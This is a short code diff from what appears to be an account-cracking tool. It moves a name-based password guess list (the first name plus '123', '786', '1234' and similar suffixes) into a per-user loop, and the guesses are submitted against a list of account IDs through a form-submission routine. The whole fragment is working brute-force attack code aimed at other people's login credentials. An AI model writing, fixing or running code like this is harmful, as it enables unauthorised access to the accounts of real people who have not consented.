@@ -515,7 +515,6 @@ class crack_main():
                         linex()
                         for user in self.id:
                                 iid,zee = user.split('|')
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 formSubmit.submit(self.rndm,iid,zee,passlist)
                 print(50*'=')
                 print(' SucessFully Process Is Completed ')
@@ -572,7 +571,8 @@ class crack_main():
                 except:
                         ln = fn
                 fs = first_name.lower()
-                ls = last_name.lower()        
+                ls = last_name.lower()
+                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                 for pw in passlist:
                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',name).replace('name',name.lower())
                 try:
